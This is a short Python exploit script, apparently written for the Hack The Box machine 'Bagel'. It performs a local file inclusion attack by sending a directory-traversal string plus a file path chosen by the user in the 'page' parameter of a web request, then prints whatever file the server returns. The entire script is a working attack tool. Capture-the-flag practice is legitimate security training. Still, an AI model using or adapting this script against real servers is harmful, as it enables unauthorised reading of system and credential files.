#!/usr/bin/python3

from pwn import *
import requests
import sys
import signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def makeLFI():
    if len(sys.argv) < 2:
        print(f"\n\033[0;37m[\033[0;31m-\033[0;37m] Uso: python3 {sys.argv[0]} archivo\n")
        sys.exit(1)
    target = "http://bagel.htb:8000/"
    lfi = {"page": f"../../../../../../../{sys.argv[1]}"}
    request = requests.get(target, params=lfi)
    p1 = log.progress("Mostrando archivo indicado")
    time.sleep(1)
    p1.status("Listo")
    print(request.text.strip())

if __name__ == '__main__':
    makeLFI()
